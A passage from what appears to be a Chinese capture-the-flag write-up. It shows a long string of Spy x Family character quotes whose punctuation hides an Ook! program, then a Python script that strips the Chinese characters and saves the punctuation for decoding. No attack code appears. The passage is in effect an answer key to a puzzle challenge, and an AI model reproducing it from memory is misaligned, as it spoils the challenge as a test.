亚合格啦!父亲做菜很好吃.阿尼亚帅不帅?阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!蓬蓬头?多亏了父亲.哇酷哇酷?救命呀!太好了.阿尼亚棒吗?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.看我必杀拳,砰!阿尼亚帅不帅?好耶!父亲,母亲,有需要帮助的人!阿尼亚喜欢厉害又帅气的母亲.蓬蓬头?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.哇酷哇酷?会没事的.阿尼亚棒吗?要帮助他!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚可爱吗?我想永远和他们在一起.父亲做菜很好吃.太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.花生!蓬蓬头?阿尼亚想吃蛋包饭!警惕!父亲是间谍.哇酷哇酷?阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚棒吗?母亲是杀手.阿尼亚可爱吗?救命呀!父亲和母亲甜甜蜜蜜.阿尼亚帅不帅?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚好想看呀!哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚帅不帅?好耶!阿尼亚从孤儿院出来以后,遇到了好多开心的事.蓬蓬头?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.父亲,母亲,有需要帮助的人!太好了.哇酷哇酷?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.要帮助他!阿尼亚棒吗?太好了!花生!我想永远和他们在一起.阿尼亚可爱吗?阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚帅不帅?父亲做菜很好吃.蓬蓬头?阿尼亚好想看呀!多亏了父亲.哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!太好了.阿尼亚棒吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.阿尼亚在学校也会加油的!阿尼亚可爱吗?阿尼亚必须加油!营救公主的间谍!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.蓬蓬头?我想永远和他们在一起.哇酷哇酷?是住在城堡里的奇美拉!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.救命呀!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.'

temp = re.sub('[\u4e00-\u9fa5]', '', string)
with open('decrypt_flag.txt', 'w') as ff:
    for i in temp:
        if (i == '.' or i == '?' or i == '!'):
            ff.write(i)

print(temp)

# ff.close()
print('End')
```

这里学到了一个新的东西 `re.sub()`，这个函数可以用来正则替换字符串中的匹配项

在正则表达式中 `[\u4e00-\u9fa5]`代表**中文的unicode编码范围**

```python
re.sub('[\u4e00-\u9fa5]', '', string)
```

将所有中文替换为空

运行脚本后，我们直接去网站解密：[ook](https://www.splitbrain.org/services/ook)













